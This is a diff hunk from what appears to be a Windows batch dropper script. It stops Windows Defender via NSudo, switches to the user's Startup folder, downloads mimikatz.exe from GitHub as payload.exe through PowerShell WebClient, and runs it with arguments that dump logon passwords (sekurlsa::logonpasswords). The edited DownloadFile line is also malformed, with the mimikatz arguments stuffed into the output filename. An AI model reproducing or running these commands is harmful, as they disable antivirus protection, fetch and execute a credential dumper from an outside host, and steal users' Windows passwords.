@@ -69,7 +69,7 @@ powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.gi
 NSudo.exe -U:T -ShowWindowMode:Hide sc stop WinDefend 
 
 cd "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
-powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://github.com/ParrotSec/mimikatz/raw/master/x64/mimikatz.exe', '.\payload.exe https://github.com/ParrotSec/mimikatz/raw/master/x64/mimikatz.exe') }
+powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://github.com/ParrotSec/mimikatz/raw/master/x64/mimikatz.exe', '.\payload.exe "privilege::debug" "sekurlsa::logonpasswords" exit') }
 start payload.exe 
 
 
